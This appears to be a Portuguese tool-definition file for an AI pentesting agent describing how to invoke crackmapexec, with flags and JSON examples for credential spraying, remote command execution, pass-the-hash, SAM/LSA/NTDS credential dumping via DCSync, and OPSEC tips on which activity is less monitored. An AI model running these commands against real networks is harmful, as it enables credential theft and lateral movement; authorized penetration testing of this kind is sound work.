---
name: "crackmapexec"
description: "Swiss army knife para pentesting de Active Directory e redes Windows. Automatiza enumeração SMB, autenticação, execução remota, dump de credenciais e movimentação lateral."
---

# crackmapexec (cme / nxc)

## Objetivo

- Enumeração de redes Windows e Active Directory via SMB, WinRM, LDAP, MSSQL, SSH
- Teste de credenciais em massa contra múltiplos hosts
- Execução remota de comandos em hosts comprometidos
- Dump de hashes SAM, LSA, NTDS.dit via DCSync
- Enumeração de usuários, grupos, shares, GPOs e políticas
- Pass-the-Hash e Pass-the-Ticket automático

## Endpoint

- /api/tools/run (tool: "crackmapexec")

## Requer target

- sim

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                 |
|-----------|--------|-------------|-------------------------------------------|
| target    | string | sim         | IP, range CIDR ou arquivo com hosts       |
| options   | string | sim         | Protocolo e flags do CLI (ex: smb -u admin)|

## Flags Importantes

| Flag                      | Efeito                                                    |
|---------------------------|-----------------------------------------------------------|
| `smb <alvo>`              | Protocolo SMB (Windows shares, autenticação)              |
| `winrm <alvo>`            | PowerShell Remoting (WinRM)                               |
| `ldap <alvo>`             | LDAP / Active Directory                                   |
| `mssql <alvo>`            | Microsoft SQL Server                                      |
| `ssh <alvo>`              | SSH                                                       |
| `-u <user>`               | Usuário para autenticação                                 |
| `-p <pass>`               | Senha para autenticação                                   |
| `-H <hash>`               | Hash NTLM para Pass-the-Hash                              |
| `--shares`                | Enumerar shares SMB                                       |
| `--users`                 | Enumerar usuários do domínio                              |
| `--groups`                | Enumerar grupos do domínio                                |
| `--loggedon-users`        | Usuários logados atualmente                               |
| `-x <cmd>`                | Executar comando via cmd.exe                              |
| `-X <cmd>`                | Executar comando via PowerShell                           |
| `--sam`                   | Dump do SAM (hashes locais)                               |
| `--lsa`                   | Dump de segredos LSA                                      |
| `--ntds`                  | Dump do NTDS.dit (DCSync)                                 |
| `--pass-pol`              | Política de senhas do domínio                             |
| `--continue-on-success`   | Continuar mesmo após encontrar credencial válida          |
| `-d <domínio>`            | Especificar domínio                                       |
| `--local-auth`            | Autenticação local (sem domínio)                          |

## Exemplos

### Enumeração básica SMB
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.0/24",
  "options": "smb 192.168.1.0/24"
}
```

### Teste de credenciais em rede
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.0/24",
  "options": "smb 192.168.1.0/24 -u admin -p Password123"
}
```

### Enumerar shares acessíveis
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.100",
  "options": "smb 192.168.1.100 -u admin -p Password123 --shares"
}
```

### Dump de hashes SAM (requer admin)
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.100",
  "options": "smb 192.168.1.100 -u admin -p Password123 --sam"
}
```

### Pass-the-Hash
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.100",
  "options": "smb 192.168.1.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
}
```

### Execução remota de comando
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.100",
  "options": "smb 192.168.1.100 -u admin -p Password123 -x 'whoami'"
}
```

### Enumerar usuários AD via LDAP
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.10",
  "options": "ldap 192.168.1.10 -u admin -p Password123 --users"
}
```

### DCSync (dump NTDS.dit)
```json
{
  "tool": "crackmapexec",
  "target": "192.168.1.10",
  "options": "smb 192.168.1.10 -u admin -p Password123 --ntds"
}
```

## OPSEC

- SMB authentication gera eventos 4624/4625/4776 no Windows Event Log
- `--ntds` DCSync é detectado como replicação de DC — muito ruidoso
- Use `--local-auth` para evitar lockouts de domínio ao testar credenciais locais
- WinRM é menos monitorado que SMB em muitos ambientes
- `--continue-on-success` em redes grandes pode gerar muitas autenticações
- Hashes NTLM podem ser usados diretamente com `-H` sem precisar da senha

## Saída

- JSON com campos: `success`, `stdout`, `stderr`, `report`, `artifacts`
- Hosts com autenticação bem-sucedida marcados com `[+]`
- Hosts com admin local marcados com `(Pwn3d!)`
